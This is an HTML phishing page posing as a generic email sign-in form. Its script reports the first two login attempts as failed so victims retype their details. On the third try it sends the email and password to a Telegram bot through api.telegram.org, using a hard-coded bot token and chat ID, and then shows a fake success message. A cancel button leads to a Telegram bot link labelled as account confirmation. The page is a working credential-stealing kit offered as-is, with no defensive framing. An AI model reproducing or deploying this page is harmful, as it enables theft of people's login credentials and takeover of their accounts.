<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial;
            margin: 0;
        }
        .box {
            background: white;
            padding: 40px;
            border: 1px solid #ccc;
            border-radius: 10px;
            width: 350px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        .cancel {
            background: #dc3545;
        }
        .error { color: red; margin: 10px 0; }
        .success { color: green; margin: 10px 0; }
    </style>
</head>
<body>
<div class="box">
    <h2>Sign in</h2>
    <input type="email" id="email" placeholder="Email">
    <input type="password" id="pass" placeholder="Password">
    <button onclick="doLogin()">Login</button>
    <button class="cancel" onclick="goToBot()">Cancel - Back to Bot</button>
    <div id="msg"></div>
</div>

<script>
    let count = 0;
    let savedEmail = "";
    
    async function doLogin() {
        let email = document.getElementById('email').value;
        let pass = document.getElementById('pass').value;
        let msgDiv = document.getElementById('msg');
        
        if (!email || !pass) {
            msgDiv.innerHTML = '<div class="error">Fill all fields!</div>';
            return;
        }
        
        count++;
        
        if (count < 3) {
            msgDiv.innerHTML = '<div class="error">Attempt ' + count + ' failed! Try again.</div>';
            document.getElementById('email').value = '';
            document.getElementById('pass').value = '';
            return;
        }
        
        // درېیم ځل بریالی
        let text = "✅ LOGIN SUCCESS\nEmail: " + email + "\nPass: " + pass;
        
        await fetch('https://api.telegram.org/bot8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: '8295417969',
                text: text
            })
        });
        
        msgDiv.innerHTML = '<div class="success">✅ Success! You can now close this page.</div>';
    }
    
    function goToBot() {
        window.location.href = 'https://t.me/imrankhabot?start=confirm_account';
    }
</script>
</body>
</html>
